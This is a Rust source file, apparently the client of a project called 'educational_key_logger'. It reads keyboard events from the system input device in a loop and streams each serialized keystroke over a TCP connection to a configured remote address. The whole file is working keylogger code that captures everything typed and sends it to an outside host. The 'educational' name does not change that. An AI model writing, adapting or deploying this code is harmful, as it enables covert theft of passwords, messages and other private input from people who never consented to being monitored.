mod keylogger;
use educational_key_logger::IP_PORT;
use keylogger::{get_device_file, get_key_event};
use std::{io::Write, net::TcpStream, thread, time::Duration};

fn main() {
    let mut stream = TcpStream::connect(IP_PORT).unwrap();
    let device = get_device_file();
    loop {
        thread::sleep(Duration::from_millis(10));
        let key_event = get_key_event(&device);
        if !key_event.is_key_event() {
            continue;
        };
        let encoded = postcard::to_allocvec(&key_event).unwrap();
        let size = encoded.len();
        debug_assert!(
            size <= u8::MAX.into(),
            "Encoded InputEvent should never be larger than 255 bytes."
        );
        if let Err(err) = stream.write_all(&(size as u8).to_be_bytes()) {
            println!("Failed: {}", err)
        }
        if let Err(err) = stream.write_all(&encoded) {
            println!("Failed: {}", err)
        };
    }
}
